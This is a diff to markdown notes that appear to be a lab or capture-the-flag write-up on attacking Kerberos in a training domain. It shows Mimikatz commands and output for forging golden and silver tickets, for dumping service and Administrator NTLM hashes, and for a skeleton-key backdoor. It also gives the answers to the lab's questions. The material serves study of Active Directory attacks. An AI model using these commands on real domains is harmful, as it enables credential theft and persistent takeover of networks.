@@ -946,38 +946,7 @@ User : krbtgt
   Hash NTLM: 72cd714611b64cd4d5550cd2759db3f6
     ntlm- 0: 72cd714611b64cd4d5550cd2759db3f6
     lm  - 0: aec7e106ddd23b3928f7b530f60df4b6
-
- * WDigest
-    01  d2e9aa3caa4509c3f11521c70539e4ad
-    02  c9a868fc195308b03d72daa4a5a4ee47
-    03  171e066e448391c934d0681986f09ff4 
-    04  d2e9aa3caa4509c3f11521c70539e4ad
-    05  c9a868fc195308b03d72daa4a5a4ee47
-    06  41903264777c4392345816b7ecbf0885
-    07  d2e9aa3caa4509c3f11521c70539e4ad
-    08  9a01474aa116953e6db452bb5cd7dc49
-    09  a8e9a6a41c9a6bf658094206b51a4ead
-    10  8720ff9de506f647ad30f6967b8fe61e
-    11  841061e45fdc428e3f10f69ec46a9c6d
-    12  a8e9a6a41c9a6bf658094206b51a4ead
-    13  89d0db1c4f5d63ef4bacca5369f79a55 
-    14  841061e45fdc428e3f10f69ec46a9c6d
-    15  a02ffdef87fc2a3969554c3f5465042a
-    16  4ce3ef8eb619a101919eee6cc0f22060
-    17  a7c3387ac2f0d6c6a37ee34aecf8e47e
-    18  085f371533fc3860fdbf0c44148ae730
-    19  265525114c2c3581340ddb00e018683b
-    20  f5708f35889eee51a5fa0fb4ef337a9b
-    21  bffaf3c4eba18fd4c845965b64fca8e2
-    22  bffaf3c4eba18fd4c845965b64fca8e2
-    23  3c10f0ae74f162c4b81bf2a463a344aa
-    24  96141c5119871bfb2a29c7ea7f0facef 
-    25  f9e06fa832311bd00a07323980819074
-    26  99d1dd6629056af22d1aea639398825b
-    27  919f61b2c84eb1ff8d49ddc7871ab9e0
-    28  d5c266414ac9496e0e66ddcac2cbcc3b
-    29  aae5e850f950ef83a371abda478e05db
-
+    
  * Kerberos
     Default Salt : CONTROLLER.LOCALkrbtgt
     Credentials
@@ -994,4 +963,100 @@ User : krbtgt
  * NTLM-Strong-NTOWF
     Random Value : 4b9102d709aada4d56a27b6c3cd14223
 ```
+### Creating a Golden/Silver Ticket
+
+With the above info and using Mimikatz we can build a golden ticket.
+
+`Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500` *- This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.*
+
+```
+mimikatz # Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-15021588
+60 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500
+User      : Administrator 
+Domain    : controller.local (CONTROLLER)
+SID       : S-1-5-21-432953485-3795405108-1502158860
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 72cd714611b64cd4d5550cd2759db3f6 - rc4_hmac_nt
+Lifetime  : 8/4/2021 6:13:53 PM ; 8/2/2031 6:13:53 PM ; 8/2/2031 6:13:53 PM
+-> Ticket : ticket.kirbi
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Final Ticket Saved to file !
+
+```
+
+### Using the Ticket to access other machines
+
+1. `misc::cmd` this will open a new elevated command prompt with the given ticket in mimikatz.
+
+``
+mimikatz # misc::cmd 
+Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF6E59D43B8 
+``
+
+2. Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.
+
+### Questions
+
+
+1. What is the SQLService NTLM Hash?
+
+In Mimikatz `lsadump::lsa /inject /name:SQLService`
+
+```
+mimikatz # lsadump::lsa /inject /name:SQLService 
+Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860 
+
+RID  : 00000455 (1109)
+User : SQLService
+
+ * Primary
+    NTLM : cd40c9ed96265531b21fc5b1dafcfb0a
+    LM   :
+  Hash NTLM: cd40c9ed96265531b21fc5b1dafcfb0a 
+    ntlm- 0: cd40c9ed96265531b21fc5b1dafcfb0a
+    lm  - 0: 7bb53f77cde2f49c17190f7a071bd3a0
+```
+**A** cd40c9ed96265531b21fc5b1dafcfb0a
+
+2. What is the Administrator NTLM Hash?
+
+In Mimikatz `lsadump::lsa /inject /name:Administrator`
+
+```
+mimikatz # lsadump::lsa /inject /name:Administrator 
+Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860 
+
+RID  : 000001f4 (500)
+User : Administrator
+
+ * Primary
+    NTLM : 2777b7fec870e04dda00cd7260f7bee6
+    LM   :
+  Hash NTLM: 2777b7fec870e04dda00cd7260f7bee6
+```
+**A** 2777b7fec870e04dda00cd7260f7bee6
+
+Kerberos Backdoors with Mimikatz
+============================================================================================================================================
+
+**TLDR** *mimikatz can create and use a skeleton Key to access the domain forest*
+
+Implanting itself into the memory of the domain forest (similar to a rootkit) the Kerberos Backdoor with mimikatz, by creating and using a skeleton Key, can exploit the way th AS-REQ validates encrypted timestamps. It only works using Kerberos RC4 encryption.
+
+The default hash for a mimikatz skeleton key is `60BA4FCADC466C7A033C178194C03DF6` which makes the password -"mimikatz"
+
+### Skeleton Key Overview
+- Timestamp is encrypted with the users NT hash.
+- DC tries to decrypt this timestamp with the users NT hash
+- Skeleton key is implanted 
+- DC tries to decrypt the timestamp with both user NT hash and skeleton key NT hash
+- Allowing access to the Domain Forest
+
 
